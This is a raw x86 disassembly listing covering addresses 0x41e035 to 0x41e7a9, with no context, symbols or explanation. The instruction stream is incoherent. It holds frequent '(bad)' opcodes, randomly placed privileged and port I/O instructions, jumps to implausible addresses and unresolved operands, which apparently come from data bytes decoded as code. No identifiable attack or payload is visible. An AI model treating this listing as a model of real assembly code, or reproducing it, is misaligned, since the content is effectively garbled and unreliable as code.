  41e035:	jl     0x41e066
  41e037:	inc    ebp
  41e038:	add    dh,BYTE PTR [ebx+eax*1-0x5b]
  41e03c:	pop    edi
  41e03d:	pushf  
  41e03e:	jns    0x41dfc5
  41e040:	ficomp WORD PTR [ebp+0x32]
  41e043:	dec    edx
  41e044:	bound  edi,QWORD PTR [edx]
  41e046:	aam    0xb9
  41e048:	sahf   
  41e049:	xchg   DWORD PTR ds:0x24418a93,esi
  41e04f:	xchg   edi,eax
  41e050:	in     al,dx
  41e051:	not    BYTE PTR [eax]
  41e053:	add    BYTE PTR [esi-0x744be950],0x3c
  41e05a:	mov    esi,0xfc7a8fb3
  41e05f:	and    esi,ecx
  41e061:	inc    edx
  41e062:	sbb    edi,ebp
  41e064:	jge    0x41e0a8
  41e066:	mov    al,ds:0xed477ee9
  41e06b:	inc    BYTE PTR [ebx-0x80]
  41e06e:	sbb    DWORD PTR [ebp+0x45fcabcc],ebx
  41e074:	jge    0x41e0a9
  41e076:	data16 aam 0x28
  41e079:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e07a:	test   eax,0x6caf4bf3
  41e07f:	xor    eax,0x8ec2418a
  41e084:	repnz mov ebx,0x2aad7aa5
  41e08a:	xchg   edi,eax
  41e08b:	iret   
  41e08c:	and    eax,0xbe8aefdd
  41e091:	loop   0x41e022
  41e093:	inc    eax
  41e094:	mov    dh,0xdf
  41e096:	pop    edx
  41e097:	mov    bl,0x52
  41e099:	ja     0x41e05b
  41e09b:	out    dx,al
  41e09c:	cli    
  41e09d:	jne    0x41e0ca
  41e09f:	mov    bh,0x2a
  41e0a1:	std    
  41e0a2:	dec    esp
  41e0a3:	or     DWORD PTR [esi-0x1],edi
  41e0a6:	lock cmp al,0x4e
  41e0a9:	mov    ?,WORD PTR [ebx]
  41e0ab:	xchg   DWORD PTR [esi-0x24388569],esp
  41e0b1:	sar    DWORD PTR [ecx+0x241be1df],1
  41e0b7:	xor    esi,DWORD PTR [esi]
  41e0b9:	aad    0x8b
  41e0bb:	lea    esp,[ebx-0x36]
  41e0be:	xchg   ebp,eax
  41e0bf:	orps   xmm7,XMMWORD PTR [eax]
  41e0c2:	loopne 0x41e0d6
  41e0c4:	jb     0x41e11a
  41e0c6:	xchg   edi,eax
  41e0c7:	sahf   
  41e0c8:	mov    esp,0x2e714cc
  41e0cd:	int3   
  41e0ce:	cli    
  41e0cf:	inc    eax
  41e0d0:	arpl   cx,ax
  41e0d2:	jecxz  0x41e099
  41e0d4:	xor    edx,eax
  41e0d6:	xor    edi,eax
  41e0d8:	add    edi,ecx
  41e0da:	jmp    0x41e5ec
  41e0df:	cmp    al,0xc0
  41e0e1:	leave  
  41e0e2:	retf   
  41e0e3:	leave  
  41e0e4:	leave  
  41e0e5:	ret    0xc9c7
  41e0e8:	outs   dx,BYTE PTR ds:[esi]
  41e0e9:	retf   
  41e0ea:	jge    0x41e100
  41e0ec:	mov    cl,0x8f
  41e0ee:	cmc    
  41e0ef:	call   0x73ba60a8
  41e0f4:	jl     0x41e16e
  41e0f6:	js     0x41e113
  41e0f8:	(bad)  
  41e0f9:	adc    BYTE PTR [ecx-0x42],cl
  41e0fc:	pop    ebx
  41e0fd:	or     al,0x61
  41e0ff:	hlt    
  41e100:	dec    esp
  41e101:	and    bh,BYTE PTR [ebx+0x3542571d]
  41e107:	ret    0xedac
  41e10a:	(bad)  
  41e10b:	jmp    0x41e0ec
  41e10d:	cmp    ebp,edx
  41e10f:	pop    edx
  41e110:	out    dx,al
  41e111:	and    DWORD PTR gs:[eax],0x1b07bb40
  41e118:	fstp   DWORD PTR [ebx-0x7eff31e1]
  41e11e:	retf   
  41e11f:	test   DWORD PTR fs:[ebx],esi
  41e122:	ret    0x1caa
  41e125:	cwde   
  41e126:	lock leave 
  41e128:	xchg   BYTE PTR [edi+0x288afa5d],ch
  41e12e:	mov    ebp,0x834fd661
  41e133:	add    al,0x58
  41e135:	xor    DWORD PTR [esi+0x61],ebx
  41e138:	cdq    
  41e139:	rcr    bh,1
  41e13b:	and    eax,0xcfaea5e7
  41e140:	jb     0x41e14c
  41e142:	and    eax,edx
  41e144:	sbb    DWORD PTR [esi+0x2dd302ce],ecx
  41e14a:	imul   ebp,DWORD PTR [ecx-0x5abafa7e],0xffffffcc
  41e151:	mov    cl,0xd0
  41e154:	push   esi
  41e155:	push   ss
  41e156:	aas    
  41e157:	or     eax,0xb63c5493
  41e15c:	dec    edi
  41e15d:	and    eax,edi
  41e15f:	mov    eax,0xdb7ee5de
  41e164:	ds in  eax,dx
  41e166:	cmp    DWORD PTR [edi-0x6ed9d563],0x1
  41e16d:	into   
  41e16e:	les    ebx,FWORD PTR [ebx-0x1c]
  41e171:	sub    esi,ecx
  41e173:	xchg   esp,eax
  41e174:	pop    edi
  41e175:	rcl    edi,cl
  41e177:	cmp    eax,0x4e9d87bd
  41e17c:	ret    0x6993
  41e17f:	out    dx,al
  41e180:	or     al,0x7c
  41e182:	push   ecx
  41e183:	xchg   edx,eax
  41e184:	or     edi,ecx
  41e186:	dec    ebx
  41e187:	aam    0x50
  41e189:	fnstsw ax
  41e18b:	hlt    
  41e18c:	stos   DWORD PTR es:[edi],eax
  41e18d:	in     al,0x4
  41e18f:	sti    
  41e190:	jnp    0x41e160
  41e192:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e193:	dec    ebx
  41e194:	dec    edx
  41e195:	push   esi
  41e196:	jge    0x41e11e
  41e198:	push   esp
  41e199:	ficomp WORD PTR [ecx]
  41e19b:	pusha  
  41e19c:	inc    eax
  41e19d:	popa   
  41e19e:	outs   dx,DWORD PTR ds:[esi]
  41e19f:	push   ebp
  41e1a0:	leave  
  41e1a1:	cmp    BYTE PTR [ebp-0x11],ch
  41e1a4:	xchg   ebx,eax
  41e1a5:	aad    0xd
  41e1a7:	pop    ecx
  41e1a8:	dec    ebx
  41e1a9:	or     BYTE PTR [edi+esi*1],bl
  41e1ac:	(bad)  
  41e1ad:	out    dx,al
  41e1ae:	imul   ebx,eax,0xb811e39b
  41e1b4:	call   DWORD PTR [ebx+0x10]
  41e1b7:	inc    esi
  41e1b8:	icebp  
  41e1b9:	scas   al,BYTE PTR es:[edi]
  41e1ba:	(bad)  
  41e1bc:	(bad)  
  41e1bd:	mul    edi
  41e1bf:	imul   esp,DWORD PTR [ebx],0xffffffc6
  41e1c2:	mov    esp,0xadab960c
  41e1c7:	jg     0x41e17f
  41e1c9:	rcl    DWORD PTR [ecx-0x540454bc],cl
  41e1cf:	dec    ecx
  41e1d0:	arpl   WORD PTR ds:0xd759788a,bp
  41e1d6:	mov    al,es:0x1cffc97f
  41e1dc:	mov    cl,0xa6
  41e1de:	rcr    eax,0xf3
  41e1e1:	push   edi
  41e1e2:	jmp    0x142154d5
  41e1e7:	pop    es
  41e1e8:	fnstcw WORD PTR ds:0xb30db756
  41e1ee:	push   0x9
  41e1f0:	or     DWORD PTR [esp+edi*2+0x24a74647],ecx
  41e1f7:	sahf   
  41e1f8:	idiv   BYTE PTR ds:0x7998dc44
  41e1fe:	sub    DWORD PTR [ebx+0x36e6173],edx
  41e204:	sahf   
  41e205:	fisub  DWORD PTR [ebx-0x14e7f2ab]
  41e20b:	arpl   sp,dx
  41e20d:	fstp   QWORD PTR [edx]
  41e20f:	data16 shr al,cl
  41e212:	jp     0x40569ca3
  41e218:	mov    dh,0xc0
  41e21a:	imul   eax,DWORD PTR [ebx],0x46
  41e21d:	fwait
  41e21e:	and    BYTE PTR ds:0x95871a92,0x4a
  41e225:	sbb    bh,BYTE PTR [ebp-0x4ef7589b]
  41e22b:	fstp   QWORD PTR [edx-0x39b4d218]
  41e231:	cwde   
  41e232:	pop    ecx
  41e233:	push   es
  41e234:	leave  
  41e235:	inc    ebx
  41e236:	int3   
  41e237:	imul   ebp,DWORD PTR [eax+0x40],0xffffffc3
  41e23b:	imul   esi,DWORD PTR [esi],0x2c
  41e23e:	dec    edi
  41e23f:	jp     0x41e27b
  41e241:	xchg   BYTE PTR [ebx],al
  41e243:	les    ebx,FWORD PTR [ecx+edx*2+0x65]
  41e247:	push   ss
  41e248:	cwde   
  41e249:	inc    eax
  41e24a:	rcr    bl,1
  41e24c:	nop
  41e24d:	enter  0xc166,0xdf
  41e251:	(bad)
  41e256:	cli    
  41e257:	push   edx
  41e258:	dec    ebp
  41e259:	(bad)  
  41e25a:	enter  0x4b1e,0xee
  41e25e:	mov    eax,ds:0xc1f99f9d
  41e263:	sub    DWORD PTR [edx+0x47671fe4],ebx
  41e269:	lds    esi,FWORD PTR [ebx+0x1108589c]
  41e26f:	mov    gs,WORD PTR [edi-0x21]
  41e272:	sbb    eax,0xebcbaed8
  41e277:	daa    
  41e278:	jns    0x41e26f
  41e27a:	mov    eax,0x21258ebd
  41e27f:	and    ch,BYTE PTR [edx+0x1d]
  41e282:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e283:	jo     0x41e220
  41e285:	shl    BYTE PTR [edi+edx*1-0x3c],1
  41e289:	push   edx
  41e28a:	or     eax,0xefc1be13
  41e28f:	and    edi,DWORD PTR [esi+0x733dfb92]
  41e295:	cmc    
  41e296:	out    0x3b,al
  41e298:	xlat   BYTE PTR ds:[ebx]
  41e299:	repz or dh,BYTE PTR [ecx]
  41e29c:	sbb    al,0x6b
  41e29e:	and    eax,0x7117b45d
  41e2a3:	xor    BYTE PTR [eax-0x6cc5cf4d],al
  41e2a9:	or     al,0x39
  41e2ab:	(bad)  
  41e2ac:	ficom  DWORD PTR [edi-0x20]
  41e2af:	pop    ecx
  41e2b0:	jnp    0x41e287
  41e2b2:	pop    esi
  41e2b3:	mov    al,ds:0x95567456
  41e2b8:	enter  0xded4,0x40
  41e2bc:	scas   al,BYTE PTR es:[edi]
  41e2bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e2be:	jmp    0x41e25e
  41e2c0:	sub    eax,0xd96b12d
  41e2c5:	jge    0x41e2cd
  41e2c7:	mov    ds:0x12efd8a1,al
  41e2cc:	repnz in eax,dx
  41e2ce:	ins    BYTE PTR es:[edi],dx
  41e2cf:	sub    ch,BYTE PTR [esi]
  41e2d1:	mov    ds:0x11ab43cf,eax
  41e2d6:	mov    edx,edx
  41e2d8:	push   esi
  41e2d9:	sub    BYTE PTR [edx+ebp*4],0xb5
  41e2dd:	inc    ecx
  41e2de:	addr16 cli 
  41e2e0:	jg     0x41e2fa
  41e2e2:	dec    ebp
  41e2e3:	or     BYTE PTR [ecx-0xd19fd94],cl
  41e2e9:	jmp    DWORD PTR [esi-0x5b]
  41e2ec:	shl    BYTE PTR [ebx-0x4d],0x9a
  41e2f0:	fwait
  41e2f1:	or     eax,0x865f96ab
  41e2f6:	(bad)  
  41e2f7:	int3   
  41e2f8:	int    0x2b
  41e2fa:	int    0xf5
  41e2fc:	cmp    DWORD PTR [edi+0x5072bccb],esp
  41e302:	mov    dl,0x2c
  41e304:	jle    0x41e287
  41e306:	or     al,0x9b
  41e308:	pop    ss
  41e309:	jnp    0x41e331
  41e30b:	push   0xffffff92
  41e30d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e30e:	std    
  41e30f:	sub    ah,BYTE PTR [ebx+0x2f]
  41e312:	loop   0x41e339
  41e314:	pop    esp
  41e315:	or     cl,BYTE PTR [ecx-0x7b]
  41e318:	hlt    
  41e319:	mov    WORD PTR [ecx],?
  41e31b:	dec    esi
  41e31c:	mov    eax,DWORD PTR [edx]
  41e31e:	(bad)  
  41e31f:	sahf   
  41e320:	push   0xc81b91b0
  41e325:	into   
  41e326:	out    0x42,al
  41e328:	xor    dl,bl
  41e32a:	and    eax,0x49c02633
  41e32f:	add    DWORD PTR [ebx+0x63a67427],esi
  41e335:	mov    ah,0x4d
  41e337:	stos   BYTE PTR es:[edi],al
  41e338:	outs   dx,BYTE PTR ds:[esi]
  41e339:	push   eax
  41e33a:	cli    
  41e33b:	popa   
  41e33c:	fsubr  DWORD PTR [eax+0x31e7b523]
  41e342:	aad    0x4a
  41e344:	xchg   edx,eax
  41e345:	pushf  
  41e346:	or     ah,ah
  41e348:	pop    ss
  41e349:	iret   
  41e34a:	jle    0x41e352
  41e34c:	dec    eax
  41e34d:	pop    ss
  41e34e:	cmp    al,BYTE PTR [ecx-0x4f]
  41e351:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e352:	rcl    ah,1
  41e354:	inc    ebx
  41e355:	fisttp QWORD PTR [esp+ebx*4-0x5cd0452e]
  41e35c:	sahf   
  41e35d:	sub    DWORD PTR [esp+edx*2+0x45e52c3c],eax
  41e364:	loop   0x41e33d
  41e366:	push   ss
  41e367:	popf   
  41e368:	inc    eax
  41e369:	lock push ebp
  41e36b:	mov    bl,0x9a
  41e36d:	or     eax,0xcce07a76
  41e372:	repz dec esi
  41e374:	loop   0x41e35d
  41e376:	jo     0x41e3c2
  41e378:	outs   dx,BYTE PTR ds:[esi]
  41e379:	ins    DWORD PTR es:[edi],dx
  41e37a:	imul   ecx,ebx,0x61288ec8
  41e380:	xchg   esp,eax
  41e381:	out    dx,eax
  41e382:	cmp    BYTE PTR [eax-0x36c8272],dl
  41e388:	aam    0xbe
  41e38a:	test   DWORD PTR [eax],0xf21d0ef1
  41e390:	data16 loope 0x41e361
  41e393:	inc    edx
  41e394:	mov    ch,BYTE PTR [esi-0x341bceb8]
  41e39a:	nop
  41e39b:	jo     0x41e323
  41e39d:	inc    ebp
  41e39e:	jne    0xb6352e9a
  41e3a4:	cmp    BYTE PTR [esp+eiz*4+0x58849587],ch
  41e3ab:	stos   DWORD PTR es:[edi],eax
  41e3ac:	add    al,0xf
  41e3ae:	retf   
  41e3af:	and    eax,0x40f2b55a
  41e3b4:	add    DWORD PTR [edi+0x5c9dd6b1],ecx
  41e3ba:	jo     0x41e3d7
  41e3bc:	ds cmc 
  41e3be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e3bf:	fidivr WORD PTR [ebx-0x5c]
  41e3c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e3c3:	out    dx,eax
  41e3c4:	xor    DWORD PTR [ecx],ebp
  41e3c6:	dec    edi
  41e3c7:	or     dl,BYTE PTR [edx+0x1a381531]
  41e3cd:	or     ebp,DWORD PTR [ecx-0x6cd92275]
  41e3d3:	iret   
  41e3d4:	adc    al,0x3c
  41e3d6:	jle    0x41e3d7
  41e3d8:	and    eax,0x8fda5dc6
  41e3dd:	mov    dl,0xf3
  41e3df:	push   eax
  41e3e0:	mov    al,ds:0x89a31717
  41e3e5:	jbe    0x41e37d
  41e3e7:	cli    
  41e3e8:	(bad)  
  41e3ea:	xor    bl,ch
  41e3ec:	pop    edx
  41e3ed:	jg     0x41e373
  41e3ef:	retf   
  41e3f0:	aam    0x58
  41e3f2:	lock lods al,BYTE PTR ds:[esi]
  41e3f4:	dec    esp
  41e3f5:	add    esp,DWORD PTR ds:0xc3824e61
  41e3fb:	fincstp 
  41e3fd:	inc    ecx
  41e3fe:	mov    edi,0xdb1ad568
  41e403:	repz mov ds:0xc97cdbe8,al
  41e409:	fldcw  WORD PTR [ebx-0x1379c5b0]
  41e40f:	sar    DWORD PTR [eax-0x11],cl
  41e412:	lea    edx,[edi-0x69]
  41e415:	or     BYTE PTR [ecx+edi*1],bl
  41e418:	sbb    BYTE PTR [eax+0x6b2d634b],dl
  41e41e:	sub    DWORD PTR [eax],esp
  41e420:	jo     0x41e418
  41e422:	icebp  
  41e423:	cli    
  41e424:	in     eax,dx
  41e425:	hlt    
  41e426:	adc    ebp,DWORD PTR [edx]
  41e428:	xor    al,BYTE PTR [ebx+eax*4]
  41e42b:	lds    ecx,FWORD PTR [edx+0x74421171]
  41e431:	push   esi
  41e432:	aaa    
  41e433:	inc    edx
  41e434:	test   eax,0x9b31837d
  41e439:	xor    DWORD PTR [edi+eiz*1+0x39],0x60
  41e43e:	add    esi,DWORD PTR [esi+0x39]
  41e441:	mov    ch,0x66
  41e443:	sbb    edx,edi
  41e445:	fs push ds
  41e447:	loopne 0x41e429
  41e449:	lahf   
  41e44a:	jg     0x41e3e5
  41e44c:	das    
  41e44d:	sub    DWORD PTR [esi+0x35ee3b91],edi
  41e453:	xchg   DWORD PTR [edi],ebp
  41e455:	add    eax,0x728cee4c
  41e45a:	cli    
  41e45b:	aas    
  41e45c:	jnp    0x41e3e0
  41e45e:	sub    al,BYTE PTR [eax-0x2e523dee]
  41e464:	inc    ecx
  41e465:	add    ecx,DWORD PTR [eax]
  41e467:	mov    ds:0xb3410876,al
  41e46c:	lea    ebx,[esi-0x2e1d4fde]
  41e472:	stos   BYTE PTR es:[edi],al
  41e473:	mov    ds:0x7a42cc4c,eax
  41e478:	mov    es,edi
  41e47a:	mov    ds:0x698223a6,al
  41e47f:	mov    esp,0xebe4bed9
  41e484:	xchg   ecx,eax
  41e485:	mov    eax,0x7a93d090
  41e48a:	push   esi
  41e48b:	jle    0x41e4a0
  41e48d:	mov    esi,0xd14dba37
  41e492:	push   0x3b78f386
  41e497:	or     edx,DWORD PTR [edx+esi*2+0x73f0b4e]
  41e49e:	add    DWORD PTR [esi+0x3c],ebp
  41e4a1:	dec    ecx
  41e4a2:	hlt    
  41e4a3:	repnz les esi,FWORD PTR [edx-0x23]
  41e4a7:	repnz mov ch,0xdd
  41e4aa:	pop    ebp
  41e4ab:	das    
  41e4ac:	xor    al,0xd0
  41e4ae:	call   0xc1a9:0x4f2f643e
  41e4b5:	js     0x41e46c
  41e4b7:	sbb    al,0xc7
  41e4b9:	mov    bl,0xb8
  41e4bc:	mov    ecx,0x1acc41c5
  41e4c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e4c2:	mov    cl,0xc1
  41e4c4:	lods   al,BYTE PTR ds:[esi]
  41e4c5:	jp     0x41e488
  41e4c7:	popf   
  41e4c8:	xor    eax,0x9521e92d
  41e4cd:	(bad)  
  41e4ce:	loopne 0x41e481
  41e4d0:	jg     0x41e4ea
  41e4d2:	sub    eax,esi
  41e4d4:	mov    al,ds:0x9d90b532
  41e4d9:	gs adc DWORD PTR fs:[esi],0x29
  41e4de:	mov    cl,0x62
  41e4e0:	fcom   DWORD PTR [ecx-0x3]
  41e4e3:	mov    ah,0x59
  41e4e5:	xchg   esi,eax
  41e4e6:	mov    dh,BYTE PTR ds:0x54e25fe
  41e4ec:	and    BYTE PTR [ecx+edi*4+0x3aeec28e],ch
  41e4f3:	daa    
  41e4f4:	stos   DWORD PTR es:[edi],eax
  41e4f5:	retf   0x6ab4
  41e4f8:	pusha  
  41e4f9:	push   ds
  41e4fa:	add    edx,DWORD PTR [eax-0x33b65db0]
  41e500:	(bad)  
  41e501:	sbb    esi,ebx
  41e503:	push   es
  41e504:	addr16 mov ah,0x1c
  41e507:	mov    BYTE PTR [eax-0x3109e4d5],al
  41e50d:	and    BYTE PTR [edi],al
  41e50f:	push   edi
  41e510:	adc    ch,BYTE PTR [ebp-0x39]
  41e513:	mov    ebx,0x2c99134d
  41e518:	add    al,0x39
  41e51a:	and    BYTE PTR [ebx],bh
  41e51c:	shl    BYTE PTR ds:0x45a5cc9e,1
  41e522:	mov    ecx,0x40f4077a
  41e527:	pop    ds
  41e528:	push   ebp
  41e529:	dec    esi
  41e52a:	jge    0x41e543
  41e52c:	retf   
  41e52d:	dec    ebx
  41e52e:	pop    ds
  41e52f:	mov    ebp,0xa1372cd9
  41e534:	push   esi
  41e535:	nop    ecx
  41e538:	mov    al,0xaa
  41e53a:	pop    DWORD PTR [eax]
  41e53c:	les    eax,FWORD PTR cs:[esi-0x20bea6a7]
  41e543:	add    DWORD PTR [edx-0x1d],eax
  41e546:	scas   eax,DWORD PTR es:[edi]
  41e547:	das    
  41e548:	push   cs
  41e549:	cwde   
  41e54a:	push   ebp
  41e54b:	or     BYTE PTR [ebp+0x45553b2b],dh
  41e551:	xchg   esp,eax
  41e552:	sbb    dh,BYTE PTR [eax-0x7b8c7ef4]
  41e558:	lock ret 0x88fc
  41e55c:	icebp  
  41e55d:	sbb    bh,ch
  41e55f:	aas    
  41e560:	ficomp WORD PTR [edi+edx*8-0x27]
  41e564:	icebp  
  41e565:	lea    esi,[esi-0x72]
  41e568:	stc    
  41e569:	pop    ebx
  41e56a:	jp     0x41e537
  41e56c:	cli    
  41e56d:	push   ebp
  41e56e:	adc    eax,0x47dad36d
  41e573:	mov    dl,0x5c
  41e575:	outs   dx,DWORD PTR ds:[esi]
  41e576:	sub    eax,0x57c914fd
  41e57b:	or     DWORD PTR [edx-0x48],ebx
  41e57e:	mov    ebp,0x294f1411
  41e583:	inc    eax
  41e584:	push   edi
  41e585:	xor    al,dl
  41e587:	fimul  DWORD PTR [edi-0x690c2e2b]
  41e58d:	inc    edi
  41e58e:	cld    
  41e58f:	setg   dh
  41e592:	stos   DWORD PTR es:[edi],eax
  41e593:	gs test al,0x7f
  41e596:	(bad)  [ebp-0x26]
  41e599:	sbb    cl,BYTE PTR [esi-0x19]
  41e59c:	cmp    edx,edi
  41e59e:	jne    0x41e578
  41e5a0:	aaa    
  41e5a1:	mov    ds:0xa0ca1beb,al
  41e5a6:	cmp    al,0x1c
  41e5a8:	push   es
  41e5a9:	dec    ebx
  41e5aa:	fwait
  41e5ab:	sbb    eax,DWORD PTR [ebp+0x34]
  41e5ae:	fdivr  QWORD PTR [edx-0x439fd4ce]
  41e5b4:	out    dx,eax
  41e5b5:	fisttp DWORD PTR [ebp+0x6f]
  41e5b8:	(bad)  
  41e5b9:	lds    edx,FWORD PTR [edx-0x42f8bde3]
  41e5bf:	dec    esp
  41e5c0:	inc    eax
  41e5c1:	pop    es
  41e5c2:	xchg   bh,bl
  41e5c4:	dec    esi
  41e5c5:	xchg   ebx,eax
  41e5c6:	cli    
  41e5c7:	sbb    BYTE PTR [edx-0x6038932],ch
  41e5cd:	scas   eax,DWORD PTR es:[edi]
  41e5ce:	out    0x75,al
  41e5d0:	clc    
  41e5d1:	inc    eax
  41e5d2:	ins    BYTE PTR es:[edi],dx
  41e5d3:	pushf  
  41e5d4:	gs xchg ebx,eax
  41e5d6:	aad    0x9a
  41e5d8:	mov    bl,BYTE PTR [edi-0x74]
  41e5db:	pop    esi
  41e5dc:	pop    ebx
  41e5dd:	mov    esi,0x9f1ea63f
  41e5e2:	mov    fs,WORD PTR [ebx+ebp*4+0xd]
  41e5e6:	jae    0x41e662
  41e5e8:	mov    esi,0x3e2ff59
  41e5ed:	shr    ecx,1
  41e5ef:	or     eax,0xd1000005
  41e5f4:	(bad)  
  41e5f5:	rol    eax,cl
  41e5f7:	fcmovnu st,st(1)
  41e5f9:	(bad)  
  41e5fb:	jp     0x41e5c3
  41e5fd:	or     DWORD PTR [ebp+edi*1-0x1c1a47b1],0xffffffbf
  41e605:	jg     0x41e67f
  41e607:	jae    0x41e685
  41e609:	js     0x41e683
  41e60b:	arpl   dx,si
  41e60d:	mul    bl
  41e60f:	mov    esp,0xf7a15f2c
  41e614:	xlat   BYTE PTR ds:[ebx]
  41e615:	js     0x41e665
  41e617:	or     al,BYTE PTR [edi]
  41e619:	sbb    eax,0x564cbab2
  41e61e:	leave  
  41e61f:	call   0x525a:0xee03e9c
  41e626:	sbb    BYTE PTR [ecx+ebp*8+0x52],bl
  41e62a:	leave  
  41e62b:	mov    al,0xea
  41e62d:	fisub  WORD PTR cs:[edi]
  41e630:	sub    edi,DWORD PTR [esi+ebx*1]
  41e633:	mov    ch,0x15
  41e635:	mov    cl,0x3a
  41e637:	bound  edx,QWORD PTR [esi]
  41e639:	sub    al,0x3a
  41e63b:	stos   DWORD PTR es:[edi],eax
  41e63c:	neg    BYTE PTR [ebx]
  41e63e:	dec    ecx
  41e63f:	xchg   edi,eax
  41e640:	fs inc ecx
  41e642:	popa   
  41e643:	cmp    DWORD PTR ds:0x221daf85,esi
  41e649:	jle    0x41e6be
  41e64b:	inc    esp
  41e64c:	jle    0x41e630
  41e64e:	xor    ecx,ebx
  41e650:	jecxz  0x41e5f4
  41e652:	not    esi
  41e654:	or     al,0x84
  41e656:	pop    ecx
  41e657:	imul   edi,DWORD PTR [ebp-0x3b],0x6f
  41e65b:	push   cs
  41e65c:	fcom   DWORD PTR [eax-0x6b]
  41e65f:	mov    dh,0xdd
  41e661:	xor    DWORD PTR [edx-0x37],0xefecd21
  41e668:	stos   DWORD PTR es:[edi],eax
  41e669:	mov    ebx,DWORD PTR [edi+0xea090b6]
  41e66f:	in     eax,0x16
  41e671:	push   ebx
  41e672:	cs dec edi
  41e674:	or     eax,0xf0f9c26a
  41e679:	jnp    0x41e629
  41e67b:	mov    bh,BYTE PTR [esi+ebx*2-0x56]
  41e67f:	(bad)  [ebx+0x75]
  41e682:	(bad)  
  41e684:	mov    ecx,0xd978e5b4
  41e689:	pop    esp
  41e68a:	jmp    0xd313:0x28d0ff3
  41e691:	ds ret 0x4788
  41e695:	or     al,0x3b
  41e697:	jns    0x41e6c2
  41e699:	ins    DWORD PTR es:[edi],dx
  41e69a:	add    ch,BYTE PTR [edx]
  41e69c:	or     edi,DWORD PTR [ecx-0x4218747d]
  41e6a2:	lds    esi,FWORD PTR [esi-0x4a]
  41e6a5:	xchg   DWORD PTR [eax],esp
  41e6a7:	jo     0x41e69d
  41e6a9:	loope  0x41e6a8
  41e6ab:	(bad)  
  41e6ac:	xchg   edx,eax
  41e6ad:	add    BYTE PTR [ebx-0x5a],bl
  41e6b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e6b1:	push   0xbb02ad2f
  41e6b6:	rcl    DWORD PTR [esp+eiz*2],1
  41e6b9:	pushf  
  41e6ba:	jo     0x41e732
  41e6bc:	adc    BYTE PTR [ebx+0x1502bcf5],ah
  41e6c2:	push   edx
  41e6c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e6c4:	clc    
  41e6c5:	sub    DWORD PTR [ebp-0x1c],edx
  41e6c8:	xchg   edi,eax
  41e6c9:	adc    eax,0xac2d24c8
  41e6ce:	out    dx,al
  41e6cf:	xor    BYTE PTR [ecx+0x44],cl
  41e6d2:	test   al,0x74
  41e6d4:	mov    eax,ds:0x9b6d697d
  41e6d9:	test   BYTE PTR [ebx+0x72],0xd5
  41e6dd:	jae    0x41e682
  41e6df:	cld    
  41e6e0:	xlat   BYTE PTR ds:[ebx]
  41e6e1:	out    dx,al
  41e6e2:	sbb    al,0xa0
  41e6e4:	mov    ch,0x82
  41e6e6:	(bad)  
  41e6e7:	jnp    0x41e694
  41e6e9:	test   BYTE PTR [esp+ecx*8-0x3d],bl
  41e6ed:	repz in eax,0x37
  41e6f0:	push   cs
  41e6f1:	dec    ebx
  41e6f2:	aas    
  41e6f3:	lock dec eax
  41e6f5:	adc    esp,edx
  41e6f7:	test   al,0x99
  41e6f9:	fcmove st,st(4)
  41e6fb:	adc    dl,BYTE PTR [edi+0x39]
  41e6fe:	or     al,0x59
  41e700:	cwde   
  41e701:	arpl   WORD PTR [eax],sp
  41e703:	xchg   ebp,eax
  41e704:	(bad)  
  41e705:	adc    ch,BYTE PTR [ecx-0xf3eb743]
  41e70b:	inc    eax
  41e70c:	fnstsw WORD PTR [edi+0x24]
  41e70f:	cmc    
  41e710:	lods   eax,DWORD PTR ds:[esi]
  41e711:	sub    eax,0x292add93
  41e716:	sbb    DWORD PTR [edi+ebp*1],0xffffffbc
  41e71a:	jmp    0x41e727
  41e71c:	pop    esp
  41e71d:	popf   
  41e71e:	and    DWORD PTR [edi-0x1f2f0f10],esi
  41e724:	dec    esp
  41e725:	pop    ebp
  41e726:	lahf   
  41e727:	popf   
  41e728:	dec    BYTE PTR [eax]
  41e72a:	cmc    
  41e72b:	fsubr  st,st(3)
  41e72d:	jmp    FWORD PTR ds:0x28d34183
  41e733:	scas   eax,DWORD PTR es:[edi]
  41e734:	std    
  41e735:	(bad)  
  41e736:	pop    eax
  41e737:	imul   edi,DWORD PTR [eax-0x30da8343],0x46486c4
  41e741:	push   cs
  41e742:	jmp    0x1a026d9e
  41e747:	cli    
  41e748:	shl    BYTE PTR [edx],1
  41e74a:	jo     0x41e760
  41e74c:	inc    ecx
  41e74d:	mov    cs,WORD PTR [esi+edi*2+0x5d]
  41e751:	jge    0x41e76c
  41e753:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e754:	dec    esi
  41e755:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e756:	or     DWORD PTR [edi+0xc],edi
  41e759:	ret    0x9f3d
  41e75c:	add    esp,ecx
  41e75e:	and    bl,ah
  41e760:	pushf  
  41e761:	ins    DWORD PTR es:[edi],dx
  41e762:	cdq    
  41e763:	js     0x41e78c
  41e765:	mov    dl,0xa3
  41e767:	mov    al,0xde
  41e769:	pusha  
  41e76a:	sbb    DWORD PTR [esi+ebx*1+0x32100327],eax
  41e771:	adc    eax,0x5d14a1f4
  41e776:	popf   
  41e777:	icebp  
  41e778:	inc    eax
  41e779:	push   edi
  41e77a:	and    eax,DWORD PTR [ebx+0x56]
  41e77d:	jmp    0x6eb1472c
  41e782:	or     ebp,DWORD PTR [eax]
  41e784:	cmp    dh,BYTE PTR [eax+0x2]
  41e787:	and    DWORD PTR [edx+edx*1-0x52],ebx
  41e78b:	mov    eax,ds:0x71639acf
  41e790:	and    eax,0x5defb11d
  41e795:	xor    cl,BYTE PTR [ecx-0x15]
  41e798:	pop    eax
  41e799:	test   eax,0x70a6d3cf
  41e79e:	retf   
  41e79f:	out    dx,eax
  41e7a0:	jb     0x41e72e
  41e7a2:	xlat   BYTE PTR ds:[ebx]
  41e7a3:	in     eax,0x3d
  41e7a5:	imul   esp,DWORD PTR [edx],0xc
  41e7a8:	sahf   
  41e7a9:	sahf   
